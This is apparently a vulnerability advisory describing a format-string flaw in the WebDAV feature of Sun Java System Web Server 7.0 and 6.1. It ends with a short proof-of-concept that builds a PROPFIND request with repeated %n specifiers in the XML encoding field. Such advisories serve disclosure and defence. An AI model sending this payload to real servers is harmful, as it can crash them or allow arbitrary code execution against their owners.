Sun Java System Web Server is prone to a format-string vulnerability because it fails to properly sanitize user-supplied input. The issue affects the WebDAV functionality.

Currently very few technical details are available. We will update this BID as more information emerges.

Attackers can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial-of-service condition.

The issues affects the following:

Sun Java System Web Server 7.0 without Update Release 8
Sun Java System Web Server 6.1 without Service Pack 12

s="PROPFIND /pages/ HTTP/1.1\n" # WebDAV URI
s+="Host: localhost\n"
s+="Depth: 0\n"
s+="Content-Length: 58\n"
s+="Content-Type: application/xml\n\n"
s+="<?xml version=\"1.0\" encoding=\"utf-%n%n%n%n%n%n%n%n%n%n\"?>"
